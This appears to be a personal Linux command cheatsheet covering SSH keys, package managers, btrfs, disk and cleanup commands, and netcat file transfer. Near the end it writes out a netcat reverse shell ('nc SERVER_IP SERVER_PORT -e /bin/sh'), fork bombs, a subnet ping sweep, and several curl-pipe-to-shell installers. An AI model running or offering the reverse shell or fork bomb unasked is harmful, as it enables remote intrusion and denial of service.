# [cheatsheet](./README.md)

- `Ctrl+Alt+Delete` to force systemd shutdown

## ssh

### [add git key](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent?platform=linux)

```bash
ssh-keygen -t ed25519 -C "example@gmail.com"
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub
```

<https://github.com/settings/keys>

### generate and upload SSH

```bash
key_file=~/.ssh/filename
ssh-keygen -t ed25519 -f $key_file  # -P "password" -C "comment"
ssh-copy-id -i $key_file.pub user@host
# or mkdir -p ~/.ssh/ && editor ~/.ssh/authorized_keys
```

## package managers

### apt

```bash
# show installed https://askubuntu.com/q/2389
apt-mark showmanual
# or better
zgrep 'Commandline: apt' /var/log/apt/history.log /var/log/apt/history.log.*.gz
# or
zgrep -E "Commandline: apt(|-get)" /var/log/apt/history.log*
```

### pacman

#### Update old enough arch

```bash
sudo pacman --noconfirm --needed --color always -Sy archlinux-keyring
sudo pacman --noconfirm --needed --color always -Syu
# sudo pacman --needed --color always -Syu
```

#### tune parallel downloads

```bash
sudo sed -i 's/^#ParallelDownloads = [0-9]\+/ParallelDownloads = 7/' /etc/pacman.conf
```

##### revert

```bash
sudo sed -i 's/^ParallelDownloads = [0-9]\+/#ParallelDownloads = 7/' /etc/pacman.conf
```

#### AUR

```bash
sudo pacman --noconfirm --needed --color always -S git base-devel && git clone https://aur.archlinux.org/yay-bin.git && cd yay-bin && makepkg -si --noconfirm && cd - && rm -rf yay-bin
```

#### [mirrors choose](https://wiki.archlinux.org/title/mirrors#Fetching_and_ranking_a_live_mirror_list)

```bash
sudo yay -S --color always rate-mirrors-bin
export TMPFILE="$(mktemp)"; \
    sudo true; \
    rate-mirrors --save=$TMPFILE arch --max-delay=43200 \
      && sudo mv /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist-backup \
      && sudo mv $TMPFILE /etc/pacman.d/mirrorlist
```

### dnf

#### clean

```bash
sudo dnf clean all
```

### rust

#### rustup

##### TODO

- [profile](https://rust-lang.github.io/rustup/concepts/profiles.html)
  - minimal?
- PATH

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
# or proto install rust
```

#### software

```bash
cargo install cargo-update
cargo install-update -a
```

## btrfs

```bash
sudo btrfs fi usage /

sudo btrfs balance start --full-balance --bg /
sudo btrfs balance status /
```

## distrobox

```bash
# astra linux
distrobox create --name astra --image registry.astralinux.ru/astra/ubi18:latest
```

## partitions

- `sudo cfdisk /dev/...`
  - `sudo parted`
- `nix-shell -p ntfs3g --run 'sudo ntfsfix /dev/nvme0n1p3'`
  - `nix-shell -p ntfs3g --run 'sudo ntfsfix /dev/nvme0n1p3 --clear-dirty'`

## commands

### [drop ram caches](https://linuxconfig.org/clear-cache-on-linux)

`sudo sysctl vm/drop_caches=3`

### [download "whole" site](https://pingvinus.ru/note/wget-download-sites) ([alt](https://superuser.com/q/1672776))

```bash
# set recursion depth manually
wget -r -k -l 7 -p -E -nc http://site.com/
# OR automatic
wget -mpEk http://site.com/
```

### check size of files at folder

```bash
# current folder
du . -hcd 1 | sort -hr
# current folder with files (use apparent sizes, rather than disk usage)
du . -hacd 1 --apparent-size | sort -hr
# all files in that folder recursively
du . -ha | sort -hr
```

### grep search in dir recursively

TODO add find or strings example

```bash
grep -rnw 'dir/' -e 'search'
```

### [dos2unix4folder](https://stackoverflow.com/a/11929475/15844518)

```bash
find . -type f -print0 | xargs -0 dos2unix -ic0 | xargs -0 dos2unix -b
# or for git repos
git ls-files | xargs dos2unix -ic0 | xargs dos2unix -b
```

### [bleachbit clear](https://askubuntu.com/q/671798)

```bash
sudo bleachbit --list | grep -E "[a-z0-9_\-]+\.[a-z0-9_\-]+" | grep -v system.free_disk_space | xargs sudo bleachbit --clean
```

### [clean running docker containers logs (also there is logs rotating config TODO)](https://stackoverflow.com/q/41091634)

```bash
sudo sh -c "truncate -s 0 /var/lib/docker/containers/*/*-json.log"
```

### [show motd](https://askubuntu.com/q/319528)

```bash
run-parts /etc/update-motd.d
```

### kill died terminals

unknown source

```bash
ps aux | grep sshd | grep "\w*@pts/.*" | awk {'print $2'} | xargs kill -9
```

### [cron based autoclean](https://crontab.guru/#0_0_*_*_*)

```bash
sudo crontab -e
# ---
0 0 * * * sh -c "truncate -s 0 /var/lib/docker/containers/*/*-json.log"
0 0 * * * bleachbit --list | grep -E "[a-z0-9_\-]+\.[a-z0-9_\-]+" | xargs bleachbit --clean
```

### linux fork bombs

```bash
# spams function calls
:(){ :|:& };:
# redirect yes output to "no" file
yes > no
```

### Ping whole subnet

```bash
subnet='46.175.145'; for i in {0..255}; do timeout 0.5 ping -c1 $subnet.$i; done
```

### send nc/netcat/croc etc

- use GNU or OpenBSD version of `nc` (not libressl)
- `nc` reverse shell
  - attacker listens `nc -vlp SERVER_PORT 2>&1 | tee -a console.log`
  - victim sends `nc SERVER_IP SERVER_PORT -e /bin/sh`
- [`nc` send file](https://superuser.com/a/98323)
  - `cat FILE_NAME | netcat SERVER_IP SERVER_PORT`
  - `nc -l -p SERVER_PORT -q 1 > FILE_NAME < /dev/null`
- [croc](https://github.com/schollz/croc)
  - `curl https://getcroc.schollz.com | bash`
    - alt with `wget -O- https://getcroc.schollz.com | bash`
    - if install is [failed](https://github.com/schollz/croc/issues/765), use unpacked binary from `/tmp/` folder (it is not deleted after failed install)

### test mounted disk speed

```sh
dd if=/dev/zero of=./disk-speed-test-$(date +%Y-%m-%d'_'%H_%M_%S).img bs=100M count=10 conv=fdatasync status=progress
```

### localepreview

```sh
localepreview () {
  locale -a | grep utf8 | while read locale; do
    printf "%20s: " $locale
    LC_ALL="$locale" date +%x\ %X\ %c
  done
}
```
